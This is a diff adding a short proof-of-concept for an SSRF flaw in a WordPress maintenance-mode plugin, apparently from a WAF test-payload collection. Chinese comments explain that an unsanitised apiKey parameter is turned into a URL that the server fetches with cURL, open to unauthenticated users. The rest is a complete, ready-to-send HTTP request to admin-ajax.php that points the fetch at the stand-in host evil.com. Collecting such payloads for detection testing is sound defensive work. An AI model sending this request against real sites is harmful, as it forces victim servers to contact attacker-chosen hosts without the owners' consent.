@@ -1,0 +1,11 @@
+# Under Construction, Coming Soon & Maintenance Mode服务器请求伪造漏洞
+# includes/mc-get_lists.php文件使用“apiKey”POST参数从中创建一个https URL，而不进行消毒，并使用cURL调用它，从而导致SSRF问题。可以通过直接访问受影响的文件和ucmm_mc_api AJAX调用（对经过身份验证和未经身份验证的用户都可用）来利用此问题。
+POST /wp-admin/admin-ajax.php?acid=80001703&bid=hd_tag_m8mv25gl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25gl
+RM-PRO-Token: 7580fc5b4cab221e5d5adc03cf84c423
+RM-PRO-Time: 1742808466852
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+action=ucmm_mc_api&apiKey=-evil.com%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D
